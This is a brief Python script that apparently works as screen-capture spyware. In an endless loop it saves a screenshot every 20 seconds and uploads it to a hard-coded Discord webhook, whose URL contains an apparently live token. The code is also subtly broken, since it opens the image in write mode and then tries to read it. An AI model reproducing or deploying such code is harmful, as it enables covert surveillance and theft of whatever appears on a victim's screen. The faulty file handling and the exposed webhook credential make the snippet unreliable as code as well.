import pyautogui, requests, time



def main_loop() -> None:
    while True:
        pyautogui.screenshot().save("ss.png")

        requests.post(
            url='https://canary.discord.com/api/webhooks/1056642764701446254/LroWAHbhlld1gTQeVSSe2tNtzzmE3-Y_7u95IvVlUqo9euzZp-Ec6DvvSDTex_uGA5jd',
            files={"ss.png": open("ss.png", 'wb').read()}
        )

        time.sleep(20)


